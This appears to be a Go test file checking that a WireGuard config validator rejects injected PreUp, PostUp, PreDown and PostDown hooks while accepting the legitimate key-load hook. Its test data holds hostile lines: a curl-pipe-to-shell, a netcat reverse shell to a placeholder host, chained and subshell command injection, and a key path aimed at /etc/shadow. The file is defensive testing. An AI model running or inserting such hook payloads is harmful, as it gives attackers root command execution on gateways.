package main

// The control node authenticates but is NOT trusted to run commands. wg-quick
// executes PreUp/PostUp/PreDown/PostDown as root, and the whole wg0.conf body
// comes from the control node, so an unguarded config is arbitrary root RCE on
// every gateway. validateWgHooks is the gate; these tests are the proof it
// holds.

import "testing"

const confDir = "/etc/opnmesh"

func TestValidateWgHooksAllowsOnlyTheKeyLoadPostUp(t *testing.T) {
	good := `[Interface]
Address = 10.99.0.1/24
ListenPort = 51820
PostUp = wg set %i private-key /etc/opnmesh/keys/wg0.key

[Peer]
PublicKey = abc
AllowedIPs = 10.99.0.2/32
`
	if err := validateWgHooks(good, confDir); err != nil {
		t.Fatalf("the legitimate generated config must be accepted, got: %v", err)
	}
}

func TestValidateWgHooksRejectsInjectedHooks(t *testing.T) {
	hostile := []struct {
		name string
		conf string
	}{
		{"PostUp arbitrary command", "[Interface]\nPostUp = curl http://evil/x | sh\n"},
		{"PreUp reverse shell", "[Interface]\nPreUp = nc -e /bin/sh evil 4444\n"},
		{"PostDown persistence", "[Interface]\nPostDown = echo pwned > /tmp/x\n"},
		{"PreDown command", "[Interface]\nPreDown = /tmp/evil\n"},
		{"PostUp chained after the key load", "[Interface]\nPostUp = wg set %i private-key /etc/opnmesh/keys/wg0.key; id > /tmp/x\n"},
		{"PostUp key path escapes confdir", "[Interface]\nPostUp = wg set %i private-key /etc/shadow\n"},
		{"PostUp with a second command via subshell", "[Interface]\nPostUp = wg set %i private-key /etc/opnmesh/keys/wg0.key $(id)\n"},
		{"case-dodged postup", "[Interface]\npostup = curl http://evil | sh\n"},
	}
	for _, tc := range hostile {
		if err := validateWgHooks(tc.conf, confDir); err == nil {
			t.Fatalf("SECURITY: hostile config %q was accepted", tc.name)
		}
	}
}
